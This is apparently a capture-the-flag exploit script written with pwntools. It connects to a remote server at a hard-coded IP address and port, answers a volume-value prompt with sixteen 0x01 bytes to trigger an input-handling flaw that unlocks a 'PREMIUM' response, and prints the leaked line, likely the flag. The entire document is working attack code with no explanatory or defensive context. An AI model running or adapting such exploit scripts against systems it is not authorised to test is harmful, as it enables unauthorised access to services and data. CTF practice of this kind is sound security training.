from pwn import * 

io = remote('62.173.140.174',17400)
io.recvuntil(b'Enter the desired volume value (0-100): ')
io.sendline(b'\x01' *16 )
io.recvuntil(b'PREMIUM\n')
print(io.recvline()[:29])